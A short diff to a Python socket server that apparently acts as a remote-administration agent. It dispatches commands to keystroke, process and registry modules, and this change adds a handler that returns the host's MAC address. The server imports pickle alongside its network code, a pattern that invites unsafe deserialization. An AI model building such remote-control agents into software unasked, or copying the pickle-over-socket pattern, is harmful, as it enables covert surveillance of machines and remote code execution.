@@ -2,7 +2,7 @@ import os
 from pickle import loads, dumps
 import socket
 import threading
-import utils, process, keystroke, registry
+import utils, process, keystroke, registry, mac
 
 HOST = socket.gethostname()
 PORT = 10000
@@ -146,6 +146,15 @@ def connection_handler(connection, address):
             content, = params
             data = dumps(registry.import_reg(content))
             connection.sendall(data)
+
+        elif header == 'mac-address':
+            try:
+                ok = True
+                data = mac.get_address()
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
         
         else:
             send(connection, False)
